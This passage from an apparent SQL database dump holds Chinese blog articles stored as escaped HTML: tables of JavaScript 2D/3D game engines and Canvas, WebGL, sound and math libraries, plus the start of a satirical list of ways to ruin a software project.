align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Commercial?&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/vonkow/Rosewood&quot; target=&quot;_blank&quot;&gt;Rosewood&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/RyanWilliams/cocos2d-javascript&quot; target=&quot;_blank&quot;&gt;Cocos2D&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;BSD&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://gamejs.org/&quot; target=&quot;_blank&quot;&gt;GameJS&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;CommonJs; 可以和 RingoJs server 整合，很像 PyGame; 仅支持Canvas;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.getxc.org/&quot; target=&quot;_blank&quot;&gt;xc.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;BSD&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/vegalib/&quot; target=&quot;_blank&quot;&gt;vegalib&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;LPGL&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://sourceforge.net/projects/clanfx/&quot; target=&quot;_blank&quot;&gt;ClanFX&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.0.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Tile based&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://canvex.lazyilluminati.com/&quot; target=&quot;_blank&quot;&gt;Canvex&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;FPS&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/Osmose/bdge&quot; target=&quot;_blank&quot;&gt;bdge&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/Osmose/Sub-C-Adventure&quot; target=&quot;_blank&quot;&gt;Demo&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/mcgrue/js-verge&quot; target=&quot;_blank&quot;&gt;js-verge&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://spriteright.com/&quot; target=&quot;_blank&quot;&gt;Demo&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/BillyWM/FlixelJS&quot; target=&quot;_blank&quot;&gt;FlixelJS&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://billy.wenge-murphy.com/flixel-js/testgame.html&quot; target=&quot;_blank&quot;&gt;Demo&lt;/a&gt;&amp;nbsp;Port of Flixel (Flash) to JS.&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://flixel.org/forums/index.php?topic=2859.0&quot; target=&quot;_blank&quot;&gt;Announcement thread&lt;/a&gt;.&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://unity3d.com/&quot; target=&quot;_blank&quot;&gt;Unity3D&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Commercial (free version too)&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n', 1, 1, 0, 0, 1303308992, 1, 'admin'),
(73, 1, 'js游戏引擎之3D引擎', '', '', '&lt;p&gt;相比起成熟的游戏引擎来说，这些引擎没有包括诸如AI、声音、游戏逻辑、网络等等功能，不过，你可以使用别的一些JS库来辅助完成这些功能。&lt;/p&gt;\r\n&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th align=&quot;left&quot;&gt;Name&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Latest Release&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;License&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Notes&lt;/th&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://deanm.github.com/pre3d/&quot; target=&quot;_blank&quot;&gt;Pre3d&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.chromeexperiments.com/detail/monster/&quot; target=&quot;_blank&quot;&gt;Demo&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/mrdoob/three.js&quot; target=&quot;_blank&quot;&gt;three.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.c3dl.org/&quot; target=&quot;_blank&quot;&gt;C3DL&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2.1 (?)&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.ambiera.com/copperlicht/&quot; target=&quot;_blank&quot;&gt;CopperLicht&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.3.2 (?)&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.wxs.ca/js3d/&quot; target=&quot;_blank&quot;&gt;JS3D&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.1a (2007-02-05)&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.flashsandy.org/&quot; target=&quot;_blank&quot;&gt;Sandy 3D&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;由Haxe编辑成&amp;nbsp;JS&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/o3d/&quot; target=&quot;_blank&quot;&gt;O3D&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;BSD&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.glge.org/&quot; target=&quot;_blank&quot;&gt;GLGE&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.5.2&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://spidergl.org/&quot; target=&quot;_blank&quot;&gt;SpiderGL&lt;/a&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;h4&gt;碰撞检测&lt;/h4&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/box2dweb/&quot; target=&quot;_blank&quot;&gt;http://code.google.com/p/box2dweb/&lt;/a&gt;&amp;nbsp;– 由&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.box2d.org/&quot; target=&quot;_blank&quot;&gt;Box2D&lt;/a&gt;&amp;nbsp;移植成 JS&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h4&gt;动画&lt;/h4&gt;\r\n&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th align=&quot;left&quot;&gt;Name&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Latest Release&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;License&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Notes&lt;/th&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/batiste/sprite.js&quot; target=&quot;_blank&quot;&gt;sprite.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/batiste/sprite.js/blob/master/LICENSE&quot; target=&quot;_blank&quot;&gt;VIEW&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Created with goal of having common JS framework for dsktop and web.&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.htmlgoodies.com/daily_news/article.php/417990&quot; target=&quot;_blank&quot;&gt;1&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;h4&gt;声音&lt;/h4&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.schillmania.com/projects/soundmanager2/&quot; target=&quot;_blank&quot;&gt;SoundManager2&lt;/a&gt;&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h4&gt;图形&lt;/h4&gt;\r\n&lt;h3&gt;Canvas&lt;/h3&gt;\r\n&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th align=&quot;left&quot;&gt;Name&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Size (KB)&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;License&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;IE&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;SVG&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Docs&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Notes&lt;/th&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/canto-js/&quot; target=&quot;_blank&quot;&gt;canto.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;56&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://github.com/kangax/fabric.js/&quot; target=&quot;_blank&quot;&gt;fabric.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;97&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://kangax.github.com/fabric.js/test/demo/&quot; target=&quot;_blank&quot;&gt;Demo&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://github.com/rsandor/gury/blob/master/gury.js&quot; target=&quot;_blank&quot;&gt;gury.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;10&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/cakejs/&quot; target=&quot;_blank&quot;&gt;CAKE&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;211&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://forvar.de/js/mcl/&quot; target=&quot;_blank&quot;&gt;Mootools Canvas Library (MCL)&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;8&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://canvastoolkit.codeplex.com/&quot; target=&quot;_blank&quot;&gt;HTML5 Canvas Library&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;12&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/layered-canvas-library/&quot; target=&quot;_blank&quot;&gt;Layered Canvas Library (LCL)&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;21&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://github.com/davidbrooks/Artisan&quot; target=&quot;_blank&quot;&gt;Artisan.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;17&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/canvg/&quot; target=&quot;_blank&quot;&gt;canvg&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;78.3&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;no&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://github.com/F1LT3R/burst&quot; target=&quot;_blank&quot;&gt;burst&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;56&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;没有维护了&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://easeljs.com/&quot; target=&quot;_blank&quot;&gt;easel.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;33&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;no&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;no&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;yes&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;尝试像Flash的DisplayList 一样在 Canvas 上创建图形。&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://processingjs.org/&quot; target=&quot;_blank&quot;&gt;processing.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://github.com/hapticdata/toxiclibsjs&quot; target=&quot;_blank&quot;&gt;toxiclibsjs&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;LPGL2.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;和 processing.js 结合和很好&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/hyperandroid/CAAT/&quot; target=&quot;_blank&quot;&gt;CAAT&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/michael/unveil&quot; target=&quot;_blank&quot;&gt;Unveil.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/biilly/doodle-js&quot; target=&quot;_blank&quot;&gt;doodle.js&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;BSD&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p&gt;注意，文件尺寸比较并不一定准确，因为有些lib并没有压缩过。&lt;/p&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.quasimondo.com/StackBlurForCanvas/StackBlurDemo.html&quot; target=&quot;_blank&quot;&gt;Stackblur&lt;/a&gt;&amp;nbsp;– 在 Canvas 上实现模糊的效果&lt;/li&gt;\r\n&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.pixastic.com/&quot; target=&quot;_blank&quot;&gt;Pixastic&lt;/a&gt;&amp;nbsp;– 简单的图片操作&lt;/li&gt;\r\n&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://raphaeljs.com/&quot; target=&quot;_blank&quot;&gt;Raphaël&lt;/a&gt;&amp;nbsp;– 进行一些矢量图以及一些变化操作，能看&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://coolshell.cn/articles/3107.html&quot; target=&quot;_blank&quot;&gt;这篇文章&lt;/a&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/meltingice/CamanJS&quot; target=&quot;_blank&quot;&gt;CamanJS&lt;/a&gt;&amp;nbsp;– Canvas上的一些滤镜&lt;/li&gt;\r\n&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/millermedeiros/CanvasContext2DWrapper&quot; target=&quot;_blank&quot;&gt;CanvasContext2DWrapper&lt;/a&gt;&amp;nbsp;– Method chaining for Canvas&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;WebGL&lt;/h3&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/onegeek/webglu&quot; target=&quot;_blank&quot;&gt;WebGLU&lt;/a&gt;&amp;nbsp;– WebGL helpers&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;Color&lt;/h3&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/eligrey/color.js&quot; target=&quot;_blank&quot;&gt;color.js&lt;/a&gt;&amp;nbsp;– 颜色管理工具。 MIT&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h4&gt;Math&lt;/h4&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://sylvester.jcoglan.com/&quot; target=&quot;_blank&quot;&gt;Sylvester&lt;/a&gt;&amp;nbsp;– 数组和矩阵&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', 1, 1, 0, 0, 1303309060, 1, 'admin'),
(74, 1, '毁掉项目的五条有效方法，值得学习', '', '', '&lt;font face=&quot;微软雅黑 &quot;&gt;1. 避免花时间设计你的项目, 写需求文档;&lt;/font&gt;&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;&amp;nbsp; &amp;nbsp; 千万别跟你的客户确定好需求, 如果你不小心卷进了此类会议, 确定你掌控好会话的控制权, 给他们讲一大堆你的系统都能做些什么, 最重要的, 无论如何, 不要理会客户提出的直接需求.&lt;/font&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;2.雇佣一个没有相关行业经验或是没有专长的菜鸟级程序员来负责这个项目&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; &lt;/font&gt;&lt;br /&gt;\r\n&lt;font face=&quot;微软雅黑 &quot;&gt;&amp;nbsp; &amp;nbsp; 找个有激情的菜鸟, 丰富行业经验的开发者只会拖慢我们的进度. 有激情的菜鸟程序员会有他的想法, 你可以放心的让他自由发挥, 让他写自己喜欢的系统框架, 至于客户的需求, 等下再整合成附加功能就行. 